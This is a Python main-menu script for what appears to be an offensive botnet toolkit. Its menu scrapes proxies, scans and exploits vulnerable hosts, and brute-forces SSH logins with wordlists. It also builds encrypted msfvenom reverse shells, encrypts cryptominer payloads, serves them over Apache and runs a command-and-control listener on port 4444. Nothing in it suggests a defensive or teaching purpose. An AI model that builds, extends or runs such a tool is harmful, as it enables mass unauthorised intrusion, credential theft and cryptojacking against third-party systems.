from globals import (
    global_hosts,
    global_live_hosts,
    global_vulnerable_hosts,
    global_scraped_proxies,
    global_tested_proxies,
)
from modules.proxy_handler import load_proxies, test_proxies, scrape_proxies, add_proxy_sources
from modules.host_handler import load_hosts, load_ip_ranges, test_hosts
from modules.scanner import scan_hosts, show_results, clear_results
from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
from modules.bruteforce import load_wordlists, bruteforce_ssh
from modules.config_handler import configure_settings, load_config
from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
from modules.command_control import start_listener, c2_interface, start_apache_server
import os

def main_menu():
    global global_hosts, global_live_hosts, global_vulnerable_hosts
    global global_scraped_proxies, global_tested_proxies

    while True:
        print("\n[ Main Menu ]")
        print("1.) Add Proxy Sources")
        print("2.) Scrape Proxies")
        print("3.) Load Proxies")
        print("4.) Test Proxies")
        print("5.) Load Hosts")
        print("6.) Load IP Ranges")
        print("7.) Test Hosts")
        print("8.) Scan Hosts")
        print("9.) Show Results")
        print("10.) Clear Results")
        print("11.) Identify Vulnerabilities")
        print("12.) Exploit Vulnerable Hosts")
        print("13.) Clear All Chunks")
        print("14.) Split Large CSVs")
        print("15.) SSH Bruteforce")
        print("16.) Configuration Settings")
        print("17.) Generate Reverse Shell")
        print("18.) Manage Cryptominers")
        print("19.) Command and Control Center")
        print("20.) Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            add_proxy_sources()
        elif choice == "2":
            scrape_proxies()
        elif choice == "3":
            global_scraped_proxies = load_proxies()
        elif choice == "4":
            global_tested_proxies = test_proxies(global_scraped_proxies)
        elif choice == "5":
            global_hosts = load_hosts()
        elif choice == "6":
            global_hosts = load_ip_ranges()
        elif choice == "7":
            global_live_hosts = test_hosts(global_hosts, global_tested_proxies)
        elif choice == "8":
            scan_hosts()
        elif choice == "9":
            show_results()
        elif choice == "10":
            clear_results()
        elif choice == "11":
            global_vulnerable_hosts = identify_vulnerable_hosts(global_live_hosts)
        elif choice == "12":
            exploit_vulnerable_hosts(global_vulnerable_hosts)
        elif choice == "13":
            clear_all_chunks()
        elif choice == "14":
            base_dir = "ip_ranges"
            max_lines = input("Enter the maximum number of lines per chunk (default 200): ")
            try:
                max_lines = int(max_lines) if max_lines else 200
            except ValueError:
                max_lines = 200
            split_large_csvs(base_dir, max_lines)
        elif choice == "15":
            print("\n[ SSH Bruteforce Selected ]")
            if not global_live_hosts:
                print("[ERROR] No valid live hosts found in memory.")
                continue
            targets = global_live_hosts
            usernames, passwords = load_wordlists()
            if not usernames or not passwords:
                print("[ERROR] Unable to proceed with SSH bruteforce due to missing or empty wordlists.")
                continue
            bruteforce_ssh(targets, usernames, passwords, max_threads=5)
        elif choice == "16":
            configure_settings()
        elif choice == "17":
            print("\n[ Reverse Shell Generation ]")
            print("Listing available payloads:")
            payloads = list_payloads()
            if not payloads:
                continue

            try:
                payload_choice = int(input("Select a payload by number: ")) - 1
                if payload_choice < 0 or payload_choice >= len(payloads):
                    print("[ERROR] Invalid choice.")
                    continue
                payload = payloads[payload_choice]
            except ValueError:
                print("[ERROR] Invalid input.")
                continue

            lhost = input("Enter the LHOST (listening IP): ").strip()
            lport = input("Enter the LPORT (listening port): ").strip()
            output_format = input("Enter the output format (e.g., exe, elf, raw): ").strip()
            output_name = input("Enter the output file name: ").strip()

            shell_path = generate_msfvenom_shell(payload, lhost, lport, output_format, output_name)
            if shell_path:
                encrypt_choice = input("Do you want to encrypt the shell? (yes/no): ").strip().lower()
                if encrypt_choice == "yes":
                    encrypt_generated_shell(shell_path)
        elif choice == "18":
            print("\n[ Cryptominer Management ]")
            print("1.) List Cryptominers")
            print("2.) Encrypt All Cryptominers")
            print("3.) Return to Main Menu")

            miner_choice = input("Enter your choice: ")
            if miner_choice == "1":
                list_cryptominers()
            elif miner_choice == "2":
                encrypt_all_cryptominers()
            elif miner_choice == "3":
                continue
            else:
                print("[ERROR] Invalid choice.")
        elif choice == "19":
            print("\n[ Command and Control Center ]")
            print("1.) Start Listener")
            print("2.) Command Interface")
            print("3.) Start Apache Server for Cryptominers")
            print("4.) Return to Main Menu")

            c2_choice = input("Enter your choice: ")

            if c2_choice == "1":
                host = input("Enter listener IP (default 0.0.0.0): ") or "0.0.0.0"
                port = input("Enter listener port (default 4444): ") or "4444"
                try:
                    start_listener(host, int(port))
                except Exception as e:
                    print(f"[ERROR] Failed to start listener: {e}")

            elif c2_choice == "2":
                c2_interface()

            elif c2_choice == "3":
                directory = "payloads/cryptominers"
                port = input("Enter Apache server port (default 80): ") or "80"
                try:
                    start_apache_server(directory, int(port))
                except Exception as e:
                    print(f"[ERROR] Failed to start Apache server: {e}")

            elif c2_choice == "4":
                continue

            else:
                print("[ERROR] Invalid choice.")
        elif choice == "20":
            print("[INFO] Exiting.")
            break
        else:
            print("[ERROR] Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main_menu()
